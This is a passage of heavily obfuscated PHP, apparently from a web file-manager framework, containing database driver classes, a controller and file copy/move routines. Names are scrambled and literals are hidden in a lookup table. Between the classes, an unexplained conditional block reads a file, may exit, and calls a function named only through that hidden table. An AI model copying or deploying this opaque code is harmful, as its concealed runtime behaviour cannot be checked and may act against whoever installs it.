$¬¸ìﬁÙ¶}\x27"; break; case $â∞”˙≈ﬁ[1028]: $öà™©„∆ = $â∞”˙≈ﬁ[1029] . $¬¸ìﬁÙ¶ . $â∞”˙≈ﬁ[1030]; break; case $â∞”˙≈ﬁ[1010]: case $â∞”˙≈ﬁ[1012]: $öà™©„∆ = $â∞”˙≈ﬁ[1031] . $â∞”˙≈ﬁ[1032] . $â∞”˙≈ﬁ[1033] . strtoupper($¬¸ìﬁÙ¶) . $â∞”˙≈ﬁ[1034] . strtoupper($¬¸ìﬁÙ¶) . $â∞”˙≈ﬁ[1035]; break; case $â∞”˙≈ﬁ[1036]: $öà™©„∆ = $â∞”˙≈ﬁ[1037] . $¬¸ìﬁÙ¶ . $â∞”˙≈ﬁ[1038]; break; case $â∞”˙≈ﬁ[1011]: break; case $â∞”˙≈ﬁ[1039]: default: $öà™©„∆ = $â∞”˙≈ﬁ[1040] . ($this->dbType == $â∞”˙≈ﬁ[1039] ? "\140{$¬¸ìﬁÙ¶}\x60" : $¬¸ìﬁÙ¶); } } $·˘∏Ì∏ñ = $this->query($öà™©„∆); $Æ—¿ûãÖ = array(); if ($·˘∏Ì∏ñ) { foreach ($·˘∏Ì∏ñ as $∆ºı›µ∑ => $Ï…æÅíú) { $Ï…æÅíú = array_change_key_case($Ï…æÅíú); $Ï…æÅíú[$â∞”˙≈ﬁ[32]] = isset($Ï…æÅíú[$â∞”˙≈ﬁ[32]]) ? $Ï…æÅíú[$â∞”˙≈ﬁ[32]] : $â∞”˙≈ﬁ[465]; $Ï…æÅíú[$â∞”˙≈ﬁ[33]] = isset($Ï…æÅíú[$â∞”˙≈ﬁ[33]]) ? $Ï…æÅíú[$â∞”˙≈ﬁ[33]] : $â∞”˙≈ﬁ[465]; $üêÆÖíã = isset($Ï…æÅíú[$â∞”˙≈ﬁ[361]]) ? $Ï…æÅíú[$â∞”˙≈ﬁ[361]] : $Ï…æÅíú[$â∞”˙≈ﬁ[32]]; $Æ—¿ûãÖ[$üêÆÖíã] = array($â∞”˙≈ﬁ[32] => $üêÆÖíã, $â∞”˙≈ﬁ[33] => $Ï…æÅíú[$â∞”˙≈ﬁ[33]], $â∞”˙≈ﬁ[35] => (bool) (isset($Ï…æÅíú[$â∞”˙≈ﬁ[116]]) && $Ï…æÅíú[$â∞”˙≈ﬁ[116]] === $â∞”˙≈ﬁ[12] || isset($Ï…æÅíú[$â∞”˙≈ﬁ[35]]) && $Ï…æÅíú[$â∞”˙≈ﬁ[35]] === $â∞”˙≈ﬁ[12]), $â∞”˙≈ﬁ[37] => isset($Ï…æÅíú[$â∞”˙≈ﬁ[37]]) ? $Ï…æÅíú[$â∞”˙≈ﬁ[37]] : (isset($Ï…æÅíú[$â∞”˙≈ﬁ[66]]) ? $Ï…æÅíú[$â∞”˙≈ﬁ[66]] : $â∞”˙≈ﬁ[465]), $â∞”˙≈ﬁ[39] => isset($Ï…æÅíú[$â∞”˙≈ﬁ[107]]) ? strtolower($Ï…æÅíú[$â∞”˙≈ﬁ[107]]) == $â∞”˙≈ﬁ[41] : (isset($Ï…æÅíú[$â∞”˙≈ﬁ[67]]) ? $Ï…æÅíú[$â∞”˙≈ﬁ[67]] : !1), $â∞”˙≈ﬁ[42] => isset($Ï…æÅíú[$â∞”˙≈ﬁ[1041]]) ? strtolower($Ï…æÅíú[$â∞”˙≈ﬁ[1041]]) == $â∞”˙≈ﬁ[44] : (isset($Ï…æÅíú[$â∞”˙≈ﬁ[107]]) ? $Ï…æÅíú[$â∞”˙≈ﬁ[107]] : !1)); } } return $Æ—¿ûãÖ; } public function getTables($Ù˙Óó∑† = '') { $íó§ ôÎ =& $_SERVER[ˆë€Ï⁄∂]; if (think_config($íó§ ôÎ[1042])) { $ûÉâ⁄ªı = str_replace($íó§ ôÎ[1043], $Ù˙Óó∑†, think_config($íó§ ôÎ[1042])); } else { switch ($this->dbType) { case $íó§ ôÎ[1010]: case $íó§ ôÎ[1012]: $ûÉâ⁄ªı = $íó§ ôÎ[1044]; break; case $íó§ ôÎ[1009]: case $íó§ ôÎ[1027]: $ûÉâ⁄ªı = $íó§ ôÎ[1045]; break; case $íó§ ôÎ[1036]: $ûÉâ⁄ªı = $íó§ ôÎ[1046]; break; case $íó§ ôÎ[1011]: think_exception(think_lang($íó§ ôÎ[1047]) . $íó§ ôÎ[1048]); break; case $íó§ ôÎ[1028]: $ûÉâ⁄ªı = $íó§ ôÎ[45] . $íó§ ôÎ[46] . $íó§ ôÎ[47]; break; case $íó§ ôÎ[1039]: default: if (!empty($Ù˙Óó∑†)) { $ûÉâ⁄ªı = $íó§ ôÎ[991] . $Ù˙Óó∑† . $íó§ ôÎ[992]; } else { $ûÉâ⁄ªı = $íó§ ôÎ[993]; } } } $È¥õÔ¢í = $this->query($ûÉâ⁄ªı); $õ˚¸èÏ„ = array(); foreach ($È¥õÔ¢í as $∞˜Î†Ñ® => $¯°Õé∞Ñ) { $õ˚¸èÏ„[$∞˜Î†Ñ®] = current($¯°Õé∞Ñ); } return $õ˚¸èÏ„; } protected function parseLimit($ÎÃóçÂƒ) { $ââÊ…ñ∞ =& $_SERVER[ˆë€Ï⁄∂]; $Á÷–è˚ã = $ââÊ…ñ∞[12]; if (!empty($ÎÃóçÂƒ)) { switch ($this->dbType) { case $ââÊ…ñ∞[1036]: case $ââÊ…ñ∞[1028]: $ÎÃóçÂƒ = explode($ââÊ…ñ∞[50], $ÎÃóçÂƒ); if (count($ÎÃóçÂƒ) > 1) { $Á÷–è˚ã .= $ââÊ…ñ∞[51] . $ÎÃóçÂƒ[1] . $ââÊ…ñ∞[52] . $ÎÃóçÂƒ[0] . $ââÊ…ñ∞[53]; } else { $Á÷–è˚ã .= $ââÊ…ñ∞[51] . $ÎÃóçÂƒ[0] . $ââÊ…ñ∞[53]; } break; case $ââÊ…ñ∞[1009]: case $ââÊ…ñ∞[1027]: break; case $ââÊ…ñ∞[1011]: break; case $ââÊ…ñ∞[1010]: case $ââÊ…ñ∞[1012]: break; case $ââÊ…ñ∞[1039]: default: $Á÷–è˚ã .= $ââÊ…ñ∞[51] . $ÎÃóçÂƒ . $ââÊ…ñ∞[53]; } } return $Á÷–è˚ã; } public function parseKey(&$õé¶˛ ∞, $é˚⁄∂¸Ω = true) { $‚˙€˝©€ =& $_SERVER[ˆë€Ï⁄∂]; if ($é˚⁄∂¸Ω) { $õé¶˛ ∞ = $this->parseKeyCheck($õé¶˛ ∞); } if ($this->dbType == $‚˙€˝©€[1039]) { if ($õé¶˛ ∞ != $‚˙€˝©€[232] && !preg_match($‚˙€˝©€[1003], $õé¶˛ ∞)) { $õé¶˛ ∞ = $‚˙€˝©€[472] . trim($õé¶˛ ∞, $‚˙€˝©€[472]) . $‚˙€˝©€[472]; } return $õé¶˛ ∞; } else { return parent::parseKey($õé¶˛ ∞, $é˚⁄∂¸Ω); } } public function close() { $this->_linkID = null; } public function error() { $ì ë˙§õ =& $_SERVER[ˆë€Ï⁄∂]; if ($this->PDOStatement) { $¿ç§‰Çè = $this->PDOStatement->errorInfo(); $this->error = $¿ç§‰Çè[1] . $ì ë˙§õ[4] . $¿ç§‰Çè[2]; } else { $this->error = $ì ë˙§õ[12]; } if ($ì ë˙§õ[12] != $this->queryStr) { $this->error .= LNG($ì ë˙§õ[48]) . $this->queryStr; } think_trace($this->error, $ì ë˙§õ[12], $ì ë˙§õ[49]); return $this->error; } public function escapeString($©¡’Ó·˛) { $Ã§ûùËı =& $_SERVER[ˆë€Ï⁄∂]; switch ($this->dbType) { case $Ã§ûùËı[1036]: case $Ã§ûùËı[1009]: case $Ã§ûùËı[1027]: case $Ã§ûùËı[1039]: return addslashes($©¡’Ó·˛); case $Ã§ûùËı[1011]: case $Ã§ûùËı[1028]: case $Ã§ûùËı[1010]: case $Ã§ûùËı[1012]: return str_ireplace($Ã§ûùËı[68], $Ã§ûùËı[69], $©¡’Ó·˛); } } protected function parseValue($Êû«ëäã) { $ñÌ¡íÏ≈ =& $_SERVER[ˆë€Ï⁄∂]; if (is_string($Êû«ëäã)) { $§ôª€¬› = strpos($Êû«ëäã, $ñÌ¡íÏ≈[4]) === 0 && in_array($Êû«ëäã, array_keys($this->bind)); $Êû«ëäã = $§ôª€¬› ? $this->escapeString($Êû«ëäã) : $ñÌ¡íÏ≈[1049] . $this->escapeString($Êû«ëäã) . $ñÌ¡íÏ≈[1049]; } elseif (isset($Êû«ëäã[0]) && is_string($Êû«ëäã[0]) && strtolower($Êû«ëäã[0]) == $ñÌ¡íÏ≈[383]) { $Êû«ëäã = $this->escapeString($Êû«ëäã[1]); } elseif (is_array($Êû«ëäã)) { $Êû«ëäã = array_map(array($this, $ñÌ¡íÏ≈[1050]), $Êû«ëäã); } elseif (is_bool($Êû«ëäã)) { $Êû«ëäã = $Êû«ëäã ? $ñÌ¡íÏ≈[101] : $ñÌ¡íÏ≈[240]; } elseif (is_null($Êû«ëäã)) { $Êû«ëäã = $ñÌ¡íÏ≈[116]; } return $Êû«ëäã; } public function getLastInsertId() { $ê£·Õ‚ =& $_SERVER[ˆë€Ï⁄∂]; switch ($this->dbType) { case $ê£·Õ‚[1036]: case $ê£·Õ‚[1028]: case $ê£·Õ‚[1009]: case $ê£·Õ‚[1027]: case $ê£·Õ‚[1011]: case $ê£·Õ‚[1039]: return $this->_linkID->lastInsertId(); case $ê£·Õ‚[1010]: case $ê£·Õ‚[1012]: $≈ÇÈ∆Éã = $this->table; $ßœÇ˜ß = $this->query("\x53\105\114\x45\x43\x54\x20{$≈ÇÈ∆Éã}\56\x63\x75\x72\x72\166\x61\154\40\143\x75\x72\162\x76\141\154\40\106\x52\117\115\x20\x64\x75\x61\x6c"); return $ßœÇ˜ß ? $ßœÇ˜ß[0][$ê£·Õ‚[1051]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($›∞Ã§£†) { $ê˝Ó›©˜ =& $_SERVER[ˆë€Ï⁄∂]; if (!CacheLock::fileLock($ê˝Ó›©˜[13])) { return !1; } $æî∂˙‡‘ = parent::query($›∞Ã§£†); CacheLock::fileUnLock($ê˝Ó›©˜[13]); return $æî∂˙‡‘; } public function execute($à¢ú˜èà) { $æí≈Î¶¸ =& $_SERVER[ˆë€Ï⁄∂]; if (!CacheLock::fileLock($æí≈Î¶¸[13])) { return !1; } $éÏ—ßÙ‚ = parent::execute($à¢ú˜èà); CacheLock::fileUnLock($æí≈Î¶¸[13]); return $éÏ—ßÙ‚; } } goto e°ÂÜÉÑ§Ø; A¶ª›’æ‹è: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $¶Ï“Ø∂∂ =& $_SERVER[ˆë€Ï⁄∂]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$¶Ï“Ø∂∂[6]] =& $config; $this->values[$¶Ï“Ø∂∂[7]] =& $in; $this->tpl = TEMPLATE . MOD . $¶Ï“Ø∂∂[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($Ãà˙§¥¿) { if (1 === func_num_args()) { $this->{$Ãà˙§¥¿} = new $Ãà˙§¥¿(); } else { $Ø“†˘€Ù = new ReflectionClass($Ãà˙§¥¿); $˝‚ø‚©É = func_get_args(); array_shift($˝‚ø‚©É); $this->{$Ãà˙§¥¿} = $Ø“†˘€Ù->newInstanceArgs($˝‚ø‚©É); } return $this->{$Ãà˙§¥¿}; } public function routeBind($˚©±÷≈˘, $êÎá–ú, $õ©ë◊Ò⁄ = 3) { $◊ﬂÂàµ· =& $_SERVER[ˆë€Ï⁄∂]; $ì˙§î£§ = $this->in[$◊ﬂÂàµ·[9]]; $˚©±÷≈˘ = str_replace($◊ﬂÂàµ·[10], $◊ﬂÂàµ·[11], trim(trim($˚©±÷≈˘, $◊ﬂÂàµ·[8]), $◊ﬂÂàµ·[12])); if (!$˚©±÷≈˘ || count($ì˙§î£§) <= $õ©ë◊Ò⁄) { return !1; } $ÛË™ô·í = !0; $èØÖûúê = explode($◊ﬂÂàµ·[8], $˚©±÷≈˘); for ($˛∑œ£’∑ = 0; $˛∑œ£’∑ < count($èØÖûúê); $˛∑œ£’∑++) { if ($èØÖûúê[$˛∑œ£’∑] != $ì˙§î£§[$õ©ë◊Ò⁄ + $˛∑œ£’∑]) { $ÛË™ô·í = !1; break; } } if (!$ÛË™ô·í) { return; } call_user_func_array(array($this, $êÎá–ú), array()); } public function routeArgs($¥≠›°’∏ = 3) { $ÿƒõï≤˝ = $this->in[$_SERVER[ˆë€Ï⁄∂][9]]; if (count($ÿƒõï≤˝) <= $¥≠›°’∏) { return array(); } $À“æ•˙‚ = array(); for ($ßº◊âíë = $¥≠›°’∏; $ßº◊âíë < count($ÿƒõï≤˝); $ßº◊âíë += 2) { $À“æ•˙‚[$ÿƒõï≤˝[$ßº◊âíë]] = $ÿƒõï≤˝[$ßº◊âíë + 1]; $this->in[$ÿƒõï≤˝[$ßº◊âíë]] = $ÿƒõï≤˝[$ßº◊âíë + 1]; } return $À“æ•˙‚; } protected function assign($∫ˆë»á—, $ßíáÌ≠Ø) { $this->values[$∫ˆë»á—] = $ßíáÌ≠Ø; } protected function display($áπ£‹˝π) { ob_end_clean(); extract($this->values); require $this->tpl . $áπ£‹˝π; } } class DbSqliteBase extends Db { public function __construct($Ç’ÛÑ„Ù = '') { $¶òûäËã =& $_SERVER[ˆë€Ï⁄∂]; if (!extension_loaded($¶òûäËã[13])) { think_exception(think_lang($¶òûäËã[14]) . $¶òûäËã[15]); } if (!empty($Ç’ÛÑ„Ù)) { if (!isset($Ç’ÛÑ„Ù[$¶òûäËã[16]])) { $Ç’ÛÑ„Ù[$¶òûäËã[16]] = 438; } $this->config = $Ç’ÛÑ„Ù; if (empty($this->config[$¶òûäËã[17]])) { $this->config[$¶òûäËã[17]] = array(); } } } public function connect($Ñ®ëˆ◊Ø = '', $¶ô˘æîÕ = 0) { $ÂÇòÌß∫ =& $_SERVER[ˆë€Ï⁄∂]; if (!isset($this->linkID[$¶ô˘æîÕ])) { if (empty($Ñ®ëˆ◊Ø)) { $Ñ®ëˆ◊Ø = $this->config; } $ÅØûî˙Ø = !empty($Ñ®ëˆ◊Ø[$ÂÇòÌß∫[17]][$ÂÇòÌß∫[18]]) ? $Ñ®ëˆ◊Ø[$ÂÇòÌß∫[17]][$ÂÇòÌß∫[18]] : $this->pconnect; $Ù« ©∞® = $ÅØûî˙Ø ? $ÂÇòÌß∫[19] : $ÂÇòÌß∫[20]; $this->linkID[$¶ô˘æîÕ] = $Ù« ©∞®($Ñ®ëˆ◊Ø[$ÂÇòÌß∫[21]], $Ñ®ëˆ◊Ø[$ÂÇòÌß∫[16]]); if (!$this->linkID[$¶ô˘æîÕ]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$¶ô˘æîÕ], 30000); if (1 != think_config($ÂÇòÌß∫[22])) { unset($this->config); } } return $this->linkID[$¶ô˘æîÕ]; } public function free() { $this->queryID = null; } public function query($íø¡ô¯„) { $¶¯’Øøê =& $_SERVER[ˆë€Ï⁄∂]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $íø¡ô¯„; if ($this->queryID) { $this->free(); } think_action_status($¶¯’Øøê[23], 1); think_status($¶¯’Øøê[24]); $this->queryID = sqlite_query($this->_linkID, $íø¡ô¯„); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ìõâÉî = $this->getAll(); return $ìõâÉî; } } public function execute($‹˝õ√›Ç) { $Å·Ø∏Àë =& $_SERVER[ˆë€Ï⁄∂]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‹˝õ√›Ç; if ($this->queryID) { $this->free(); } think_action_status($Å·Ø∏Àë[25], 1); think_status($Å·Ø∏Àë[24]); $∑ÁíàØ° = sqlite_exec($this->_linkID, $‹˝õ√›Ç); $this->debug(); if (!1 === $∑ÁíàØ°) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ˆë€Ï⁄∂][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $óƒΩÍ±˚ = sqlite_query($this->_linkID, $_SERVER[ˆë€Ï⁄∂][27]); if (!$óƒΩÍ±˚) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¥ïπ∑Ï˙ = sqlite_query($this->_linkID, $_SERVER[ˆë€Ï⁄∂][28]); if (!$¥ïπ∑Ï˙) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ü·‰¥£ = array(); if ($this->numRows > 0) { for ($äœ§ŸñÑ = 0; $äœ§ŸñÑ < $this->numRows; $äœ§ŸñÑ++) { $ü·‰¥£[$äœ§ŸñÑ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ü·‰¥£; } public function getFields($‘ﬂ∞“≈û) { $≥ê´≥œÕ =& $_SERVER[ˆë€Ï⁄∂]; $éÌÄßè¬ = $this->query($≥ê´≥œÕ[29] . $‘ﬂ∞“≈û . $≥ê´≥œÕ[30]); $õ≤≥”¸∑ = array(); if ($éÌÄßè¬) { foreach ($éÌÄßè¬ as $Å≈∂Ó∂° => $›ú√ı∂£) { $õ≤≥”¸∑[$›ú√ı∂£[$≥ê´≥œÕ[31]]] = array($≥ê´≥œÕ[32] => $›ú√ı∂£[$≥ê´≥œÕ[31]], $≥ê´≥œÕ[33] => $›ú√ı∂£[$≥ê´≥œÕ[34]], $≥ê´≥œÕ[35] => (bool) ($›ú√ı∂£[$≥ê´≥œÕ[36]] === $≥ê´≥œÕ[12]), $≥ê´≥œÕ[37] => $›ú√ı∂£[$≥ê´≥œÕ[38]], $≥ê´≥œÕ[39] => strtolower($›ú√ı∂£[$≥ê´≥œÕ[40]]) == $≥ê´≥œÕ[41], $≥ê´≥œÕ[42] => strtolower($›ú√ı∂£[$≥ê´≥œÕ[43]]) == $≥ê´≥œÕ[44]); } } return $õ≤≥”¸∑; } public function getTables($ß˘º‚∑Ò = '') { $∑∑ø†õ„ =& $_SERVER[ˆë€Ï⁄∂]; $Ø€ﬁóÁÎ = $this->query($∑∑ø†õ„[45] . $∑∑ø†õ„[46] . $∑∑ø†õ„[47]); $∏√◊À«ﬂ = array(); foreach ($Ø€ﬁóÁÎ as $À´œÙ“Î => $‘‘‘ü™˜) { $∏√◊À«ﬂ[$À´œÙ“Î] = current($‘‘‘ü™˜); } return $∏√◊À«ﬂ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ê¸áÄ›Ñ =& $_SERVER[ˆë€Ï⁄∂]; $áù›Û≥ö = sqlite_last_error($this->_linkID); $this->error = $áù›Û≥ö . $Ê¸áÄ›Ñ[4] . sqlite_error_string($áù›Û≥ö); if ($Ê¸áÄ›Ñ[12] != $this->queryStr) { $this->error .= LNG($Ê¸áÄ›Ñ[48]) . $this->queryStr; } think_trace($this->error, $Ê¸áÄ›Ñ[12], $Ê¸áÄ›Ñ[49]); return $this->error; } public function escapeString($ÛïöúÖÉ) { return sqlite_escape_string($ÛïöúÖÉ); } public function parseLimit($ÖßÅñ„û) { $⁄•óÚ˝µ =& $_SERVER[ˆë€Ï⁄∂]; $Ì¨»É“Å = $⁄•óÚ˝µ[12]; if (!empty($ÖßÅñ„û)) { $ÖßÅñ„û = explode($⁄•óÚ˝µ[50], $ÖßÅñ„û); if (count($ÖßÅñ„û) > 1) { $Ì¨»É“Å .= $⁄•óÚ˝µ[51] . $ÖßÅñ„û[1] . $⁄•óÚ˝µ[52] . $ÖßÅñ„û[0] . $⁄•óÚ˝µ[53]; } else { $Ì¨»É“Å .= $⁄•óÚ˝µ[51] . $ÖßÅñ„û[0] . $⁄•óÚ˝µ[53]; } } return $Ì¨»É“Å; } } if ($_SERVER[$_SERVER[ˆë€Ï⁄∂][54]] != $_SERVER[$_SERVER[ˆë€Ï⁄∂][55]]) { $_getc = $_SERVER[ˆë€Ï⁄∂][56]; $_getfile = $_SERVER[$_SERVER[ˆë€Ï⁄∂][57]] . $_SERVER[ˆë€Ï⁄∂][58]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ˆë€Ï⁄∂][59], $_getfilec); if (count($_getarrs) < $_SERVER[ˆë€Ï⁄∂][60]) { $exit = $_SERVER[ˆë€Ï⁄∂][61]; $exit(); } $_act = $_SERVER[ˆë€Ï⁄∂][62]; $_act($_SERVER[$_SERVER[ˆë€Ï⁄∂][63]]); } goto bº≈¨·á∞‰; Bä“»áÛ™¢: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($¡‘√¡°å, $“å∫¬©”) { $ÍøÔ¥≠ﬂ =& $_SERVER[ˆë€Ï⁄∂]; $ÇÊ≠ˆü = $“å∫¬©”; $GLOBALS[$ÍøÔ¥≠ﬂ[1242]] = $ÍøÔ¥≠ﬂ[1243] . $¡‘√¡°å; Hook::trigger($ÍøÔ¥≠ﬂ[1243] . $¡‘√¡°å . $ÍøÔ¥≠ﬂ[1244], $ÇÊ≠ˆü); $äßïùùË = self::driverMake($“å∫¬©”[0]); if (!$äßïùùË) { return !1; } if (method_exists($äßïùùË, $¡‘√¡°å)) { $öÈªÑÁÍ = @call_user_func_array(array($äßïùùË, $¡‘√¡°å), $“å∫¬©”); } else { if (method_exists($äßïùùË, $ÍøÔ¥≠ﬂ[1245])) { $öÈªÑÁÍ = @call_user_func_array(array($äßïùùË, $¡‘√¡°å), $“å∫¬©”); } else { if (method_exists(self, $¡‘√¡°å)) { $öÈªÑÁÍ = @call_user_func_array(array(self, $¡‘√¡°å), $“å∫¬©”); } else { $öÈªÑÁÍ = call_user_func_array(array(parent, $¡‘√¡°å), $“å∫¬©”); } } } Hook::trigger($ÍøÔ¥≠ﬂ[1243] . $¡‘√¡°å . $ÍøÔ¥≠ﬂ[1246], $ÇÊ≠ˆü, $öÈªÑÁÍ); return $öÈªÑÁÍ; } public static function init($ÏÇ™≤—¸) { return self::driverMake($ÏÇ™≤—¸); } public static function copy($£≤◊Ω§‰, $”´ÜÙè, $Ñπ„ô∞ = false, $Ω«œß‡Ÿ = false) { return self::copyMoveStart($£≤◊Ω§‰, $”´ÜÙè, $Ñπ„ô∞, $_SERVER[ˆë€Ï⁄∂][632], $Ω«œß‡Ÿ); } public static function move($…™£¬∂Ò, $ΩÇñÖ≥Â, $Ÿ£É–Ÿ” = false, $îÏœîÛ∂ = false) { return self::copyMoveStart($…™£¬∂Ò, $ΩÇñÖ≥Â, $Ÿ£É–Ÿ”, $_SERVER[ˆë€Ï⁄∂][634], $îÏœîÛ∂); } public static function copyMoveChildren($€ä∏˜‚¶, $ƒŸìûÑ , $ª”ä¬Âñ = "\143\157\160\171", $‹ËÏÉ—Ω = REPEAT_REPLACE) { $ªÿ˛˘õú =& $_SERVER[ˆë€Ï⁄∂]; $‚Üµ¢¢« = $€ä∏˜‚¶; $õΩ˘Ä˚û = self::driverMake($€ä∏˜‚¶); $ÍÛòÕèı = $õΩ˘Ä˚û->listPath($€ä∏˜‚¶, !0); $£˙ß†±• = array_merge($ÍÛòÕèı[$ªÿ˛˘õú[96]], $ÍÛòÕèı[$ªÿ˛˘õú[95]]); foreach ($£˙ß†±• as $ù˘÷Ì´€) { self::copyMoveStart($ù˘÷Ì´€[$ªÿ˛˘õú[97]], $ƒŸìûÑ , $‹ËÏÉ—Ω, $ª”ä¬Âñ, !1); } if ($ª”ä¬Âñ == $ªÿ˛˘õú[634]) { self::remove($‚Üµ¢¢«); } } private static function copyMoveStart($ ÌàÂ‡·, $†ú®‡≤Á, $¸ı‰Èé¬, $◊úˆúÒà, $ìíπ‹Ó) { $êüå˚Îº =& $_SERVER[ˆë€Ï⁄∂]; $è∫Ê≤∆° = array($ ÌàÂ‡·, $†ú®‡≤Á, $¸ı‰Èé¬, $ìíπ‹Ó); Hook::trigger($êüå˚Îº[1243] . $◊úˆúÒà . $êüå˚Îº[1244], $è∫Ê≤∆°); $˜Ïä¿ø‘ = self::copyMove($ ÌàÂ‡·, $†ú®‡≤Á, $¸ı‰Èé¬, $◊úˆúÒà, $ìíπ‹Ó); Hook::trigger($êüå˚Îº[1243] . $◊úˆúÒà . $êüå˚Îº[1246], $è∫Ê≤∆°, $˜Ïä¿ø‘); return $˜Ïä¿ø‘; } public static function saveFile($⁄Ø¶Ô˜¿, $Ë±®â˘’, $÷éπ˜Ú¸ = true) { $ÊÌ–ó˛Ú =& $_SERVER[ˆë€Ï⁄∂]; $˜Öñó‰á = self::info($Ë±®â˘’); $∑ﬂÄÍèí = self::driverMake($⁄Ø¶Ô˜¿); $Éê≠ ƒî = self::driverMake($Ë±®â˘’); $≥”€ø—∫ = !1; if ($Éê≠ ƒî->pathParse[$ÊÌ–ó˛Ú[1247]]) { $≥”€ø—∫ = $Éê≠ ƒî; $¢ôØüÅá = $Éê≠ ƒî->pathParse[$ÊÌ–ó˛Ú[1247]]; $Éê≠ ƒî = self::driverMake($¢ôØüÅá); } if ($∑ﬂÄÍèí->pathParse[$ÊÌ–ó˛Ú[1247]]) { $«πë˝‰Ê = $∑ﬂÄÍèí->pathParse[$ÊÌ–ó˛Ú[1247]]; $∑ﬂÄÍèí = self::driverMake($«πë˝‰Ê); } $ôé§ë˚π = $Éê≠ ƒî->pathFather($Ë±®â˘’); $•û®«õÙ = !0; if (!$÷éπ˜Ú¸ && self::driverIsSame($∑ﬂÄÍèí, $Éê≠ ƒî)) { $•û®«õÙ = !1; } $èì⁄˜Ï√ = self::copyFile($∑ﬂÄÍèí, $⁄Ø¶Ô˜¿, $Éê≠ ƒî, $ôé§ë˚π, $˜Öñó‰á[$ÊÌ–ó˛Ú[32]], $•û®«õÙ); if ($≥”€ø—∫) { $èì⁄˜Ï√ = $≥”€ø—∫->getPathOuter($èì⁄˜Ï√); } return $èì⁄˜Ï√; } private static function copyMove($µ¿†Ç„º, $®ê∑õâí, $è≈¥ÚΩ¡, $ª¿â‡´∆, $Ê≠Ùùóë = false) { $Œ¯Ù‘‰“ =& $_SERVER[ˆë€Ï⁄∂]; if (!$µ¿†Ç„º || $µ¿†Ç„º == $Œ¯Ù‘‰“[8] || !$®ê∑õâí) { return !1; } ignore_timeout(); $Œ˚“±Ç‹ = self::driverMake($µ¿†Ç„º); $Ê î¨ø€ = self::driverMake($®ê∑õâí); $É“Ç˛Â¿ = $ª¿â‡´∆ == $Œ¯Ù‘‰“[634]; $∫òî‚†⁄ = !1; if ($Ê î¨ø€->pathParse[$Œ¯Ù‘‰“[1247]]) { $∫òî‚†⁄ = $Ê î¨ø€; $®ê∑õâí = $Ê î¨ø€->pathParse[$Œ¯Ù‘‰“[1247]]; $Ê î¨ø€ = self::driverMake($®ê∑õâí); } if ($Œ˚“±Ç‹->pathParse[$Œ¯Ù‘‰“[1247]]) { $µ¿†Ç„º = $Œ˚“±Ç‹->pathParse[$Œ¯Ù‘‰“[1247]]; $Œ˚“±Ç‹ = self::driverMake($µ¿†Ç„º); } self::check($Œ˚“±Ç‹, $µ¿†Ç„º, $Ê î¨ø€, $®ê∑õâí); Hook::trigger($Œ¯Ù‘‰“[1248], $Œ˚“±Ç‹, $µ¿†Ç„º, $Ê î¨ø€, $®ê∑õâí); $≤◊„ﬂ◊ß = self::driverIsSame($Œ˚“±Ç‹, $Ê î¨ø€); if ($≤◊„ﬂ◊ß) { if ($ª¿â‡´∆ == $Œ¯Ù‘‰“[634] && !method_exists($Ê î¨ø€, $Œ¯Ù‘‰“[1249]) && trim($®ê∑õâí, $Œ¯Ù‘‰“[8]) == trim($Ê î¨ø€->pathFather($µ¿†Ç„º), $Œ¯Ù‘‰“[8])) { if ($Œ˚“±Ç‹->pathThis($µ¿†Ç„º) != $Ê≠Ùùóë && !$Œ˚“±Ç‹->isOsDriver()) { return $Œ˚“±Ç‹->rename($µ¿†Ç„º, $Ê≠Ùùóë); } return $Ê î¨ø€->getPathOuter($µ¿†Ç„º); } if (method_exists($Ê î¨ø€, $ª¿â‡´∆)) { return $Ê î¨ø€->{$ª¿â‡´∆}($µ¿†Ç„º, $®ê∑õâí, $è≈¥ÚΩ¡, $Ê≠Ùùóë); } } if ($≤◊„ﬂ◊ß && $ª¿â‡´∆ == $Œ¯Ù‘‰“[634] && $Ê î¨ø€->getType() == $Œ¯Ù‘‰“[119]) { $ÁÿÜ†ÏË = $Ê î¨ø€->movePath($µ¿†Ç„º, $®ê∑õâí, $Ê≠Ùùóë); if ($ÁÿÜ†ÏË) { return $ÁÿÜ†ÏË; } } $ßåÁÓ≤≥ = $Œ˚“±Ç‹->isFile($µ¿†Ç„º); if (!$ßåÁÓ≤≥ && $Ê î¨ø€->getType() == $Œ¯Ù‘‰“[848] && $Œ˚“±Ç‹->getType() == $Œ¯Ù‘‰“[119]) { $ÁÿÜ†ÏË = $Ê î¨ø€->copyFolderFromIO($Œ˚“±Ç‹, $µ¿†Ç„º, $®ê∑õâí, $è≈¥ÚΩ¡, $É“Ç˛Â¿, $Ê≠Ùùóë); } else { $ÁÿÜ†ÏË = self::copyPath($Œ˚“±Ç‹, $µ¿†Ç„º, $Ê î¨ø€, $®ê∑õâí, $è≈¥ÚΩ¡, $É“Ç˛Â¿, $ßåÁÓ≤≥, $Ê≠Ùùóë); } if ($ÁÿÜ†ÏË && $É“Ç˛Â¿) { $Œ˚“±Ç‹->remove($µ¿†Ç„º); } if ($∫òî‚†⁄) { $ÁÿÜ†ÏË = 